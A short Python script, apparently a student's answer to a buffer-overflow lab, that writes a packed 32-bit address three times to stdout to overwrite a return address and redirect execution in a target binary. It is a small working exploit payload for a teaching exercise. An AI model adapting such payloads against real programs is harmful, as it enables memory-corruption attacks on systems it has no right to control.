#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
target_addr = 0x080488bc
target_addr = pack('<I', target_addr)
sys.stdout.buffer.write(target_addr)
sys.stdout.buffer.write(target_addr)
sys.stdout.buffer.write(target_addr)